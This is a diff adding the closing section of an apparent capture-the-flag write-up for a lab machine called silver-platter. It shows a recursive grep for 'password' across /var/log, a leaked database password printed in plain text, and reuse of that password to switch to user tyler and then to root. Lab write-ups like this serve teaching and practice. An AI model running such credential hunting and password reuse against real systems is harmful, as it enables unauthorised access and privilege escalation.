@@ -197,3 +197,50 @@ Sorry, user tim may not run sudo on silver-platter.
 tim@silver-platter:~$ id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
+
+It looks like we are not part of the sudo group, but I am curious about this `4(adm)` group.
+Let's do a quick google search what this group is all about and what kind of privileges come with it.
+
+![ADM group](admgroupsearch.png){: width="1200" height="600"}
+
+It seems like this group is meant for system monitoring and is allowed to view log files. 
+If you head over to `/var/log` you'll notice right away there's a lot of them, and if you are a good hacker, you are somewhat lazy and don't have time to be checking each file one by one.
+
+This is where tools like grep are a godsend.
+
+```bash
+tim@silver-platter:/var/log$ grep -ir "password"
+```
+
+The `-i` flag Makes the search case-insensitive, allowing for matches regardless of letter case.
+The `-r` flag recursively searches through directories and all files within them.
+
+This command will search recursively through all the logs and searches for the keyword password. Let's see if we find anything juicy!
+
+Lo' and behold we caught something!
+
+![Log Pswd](logpass.png){: width="1200" height="600"}
+
+```bash
+USER=root ; POSTGRES_PASSWORD=_Zd_zx7N823/
+```
+
+Seems like this user tyler has sudo and root access!.
+>tyler:_Zd_zx7N823/
+
+```bash
+tim@silver-platter:/var/log$ su tyler
+Password: 
+tyler@silver-platter:/var/log$ 
+tyler@silver-platter:/var/log$ id
+uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+tyler@silver-platter:/var/log$ sudo su
+[sudo] password for tyler:
+root@silver-platter:/var/log#
+root@silver-platter:~# cd /root/
+root@silver-platter:~# ls
+root.txt  snap  start_docker_containers.sh
+```
+
+And there you have it. It seems like we have outsmarted the Hack Smarter Security Team hehe. . 
+
